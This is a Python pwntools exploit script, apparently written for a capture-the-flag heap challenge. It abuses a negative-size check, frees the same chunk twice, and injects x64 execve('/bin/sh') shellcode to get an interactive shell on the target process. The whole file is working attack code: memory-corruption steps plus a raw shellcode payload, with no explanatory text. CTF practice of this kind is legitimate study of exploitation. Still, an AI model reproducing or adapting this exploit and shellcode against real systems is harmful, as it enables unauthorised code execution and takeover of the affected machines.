#coding=utf-8
from pwn import *
local = 1
argv=[""]
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./pwn")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("",)
    libc=ELF("")
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x00000000000103A)
b *(0x555555554000+0x000000000000E9E)
    ''')
def menu(idx):
    a.recvuntil("> ")
    a.sendline(str(idx))
def add(size,content):
    menu(1)
    menu(size)
    a.recvuntil("> ")
    a.send(content)
def delete():
    menu(2)
def check():
    a.recvuntil("> ")
    a.sendline("1")
    a.recvuntil("> ")
    a.sendline("-268435456")
#debug()
check()

add(0x7f,'AAA')
delete()
delete()
#debug()
add(0x7f,'\x90')
add(0x7f,'\x90')
add(0x7f,"The cake is a lie!\x00")
menu(3)
shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"


shellcode = asm("push 0")+shellcode_x64

a.recvuntil("> ")
a.send(shellcode)

a.interactive()
